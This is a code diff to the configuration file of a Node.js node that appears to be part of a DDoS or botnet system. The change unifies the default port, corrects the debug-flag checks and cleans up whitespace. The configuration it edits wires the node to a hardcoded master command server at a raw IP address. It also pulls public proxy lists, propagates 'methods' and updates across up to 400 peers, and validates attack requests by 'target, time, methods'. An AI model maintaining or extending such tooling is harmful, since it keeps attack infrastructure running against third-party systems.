@@ -7,9 +7,12 @@ import { fileURLToPath } from 'url';
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
+// FIX: Use a single constant for the default port to avoid inconsistency
+const DEFAULT_PORT = parseInt(process.env.PORT || process.env.SERVER_PORT || '5032', 10);
+
 function getStableNodeId() {
   const nodeIdFile = path.join(__dirname, '.node_id');
-  
+
   try {
     if (fs.existsSync(nodeIdFile)) {
       const savedId = fs.readFileSync(nodeIdFile, 'utf8').trim();
@@ -18,10 +21,10 @@ function getStableNodeId() {
         return savedId;
       }
     }
-    
+
     const networkInterfaces = os.networkInterfaces();
     let macAddress = '';
-   
+
     for (const interfaceName in networkInterfaces) {
       const interfaces = networkInterfaces[interfaceName];
       for (const iface of interfaces) {
@@ -32,18 +35,18 @@ function getStableNodeId() {
       }
       if (macAddress) break;
     }
-    
-    const serverPort = process.env.PORT || process.env.SERVER_PORT || 5034;
-    const uniqueString = `${os.hostname()}-${macAddress || 'no-mac'}-${process.pid}-${serverPort}-${Date.now()}`;
+
+    // FIX: Use DEFAULT_PORT (consistent with SERVER.PORT) instead of hardcoded 5034
+    const uniqueString = `${os.hostname()}-${macAddress || 'no-mac'}-${process.pid}-${DEFAULT_PORT}-${Date.now()}`;
     const nodeId = crypto
       .createHash('sha256')
       .update(uniqueString)
       .digest('hex')
       .substring(0, 32);
-    
+
     fs.writeFileSync(nodeIdFile, nodeId, 'utf8');
     console.log(`[CONFIG] Generated new stable node_id: ${nodeId}`);
-    
+
     return nodeId;
   } catch (error) {
     console.error('[CONFIG] Error generating stable node_id:', error.message);
@@ -55,7 +58,7 @@ function getStableNodeId() {
 
 const config = {
   SERVER: {
-    PORT: process.env.PORT || process.env.SERVER_PORT || 5032,
+    PORT: DEFAULT_PORT,
     NODE_ENV: process.env.NODE_ENV || 'production',
     METHODS_PATH: path.join(__dirname, '..', 'database', 'methods.json'),
     HOSTNAME: os.hostname(),
@@ -65,8 +68,8 @@ const config = {
   MASTER: {
     URL: 'http://217.154.239.23:13608',
     WS_URL: 'ws://217.154.239.23:13608/ws',
-    HEARTBEAT_INTERVAL: 65000,          
-    METHODS_SYNC_INTERVAL: 300000,      
+    HEARTBEAT_INTERVAL: 65000,
+    METHODS_SYNC_INTERVAL: 300000,
     TIMEOUT: 10000,
     NOTIFY_ON_SYNC: true
   },
@@ -105,7 +108,7 @@ const config = {
     PORT_MIN: 1,
     PORT_MAX: 65535,
   },
-  
+
   ZOMBIE_DETECTION: {
     ENABLED: true,
     CHECK_INTERVAL: 3000,
@@ -127,25 +130,25 @@ const config = {
       'https://raw.githubusercontent.com/gitrecon1455/fresh-proxy-list/refs/heads/main/proxylist.txt',
     ]
   },
-  
+
   P2P: {
-    ENABLED: true,                      
-    DISCOVERY_INTERVAL: 60000,          
-    PEER_TIMEOUT: 180000,               
-    MAX_PEERS: 400,                      
-    AUTO_CONNECT: true,                 
-    RELAY_FALLBACK: true,               
-    HEARTBEAT_INTERVAL: 45000,          
-    CONNECTION_TIMEOUT: 10000,          
-    PREFER_P2P_SYNC: true,              
-    METHOD_SYNC_INTERVAL: 120000,       
-    AUTO_PROPAGATE_UPDATES: true,       
-    ENABLE_FILE_SHARING: true,          
-    FILE_CACHE_SIZE: 100,               
-    FILE_TRANSFER_TIMEOUT: 60000,       
+    ENABLED: true,
+    DISCOVERY_INTERVAL: 60000,
+    PEER_TIMEOUT: 180000,
+    MAX_PEERS: 400,
+    AUTO_CONNECT: true,
+    RELAY_FALLBACK: true,
+    HEARTBEAT_INTERVAL: 45000,
+    CONNECTION_TIMEOUT: 10000,
+    PREFER_P2P_SYNC: true,
+    METHOD_SYNC_INTERVAL: 120000,
+    AUTO_PROPAGATE_UPDATES: true,
+    ENABLE_FILE_SHARING: true,
+    FILE_CACHE_SIZE: 100,
+    FILE_TRANSFER_TIMEOUT: 60000,
     MAX_RECONNECT_ATTEMPTS: 3,
     CONNECTION_BACKOFF_MS: 5000,
-    BLACKLIST_DURATION: 300000,         
+    BLACKLIST_DURATION: 300000,
     MESSAGE_QUEUE_SIZE: 100,
     AUTO_CONNECT_DELAY: 10000,
     CLEANUP_INTERVAL: 60000,
@@ -153,7 +156,7 @@ const config = {
     MASTER_SIGNALING_ENABLED: true,
     MASTER_SIGNALING_INTERVAL: 90000,
   },
-  
+
   MESSAGES: {
     REQUIRED_FIELDS: 'target, time, methods wajib diisi',
     INVALID_METHOD: 'methods tidak valid',
@@ -164,11 +167,11 @@ const config = {
     PROCESS_NOT_FOUND: 'Process not found',
     STATUS_ERROR: 'Gagal mengambil status sistem',
   },
-  
+
   LOGGING: {
     LEVEL: process.env.LOG_LEVEL || 'warn',
-    ENCRYPTION_DEBUG: process.env.ENCRYPTION_DEBUG === 'false',
-    P2P_DEBUG: process.env.P2P_DEBUG === 'false',
+    ENCRYPTION_DEBUG: process.env.ENCRYPTION_DEBUG === 'true',
+    P2P_DEBUG: process.env.P2P_DEBUG === 'true',
   }
 };
 
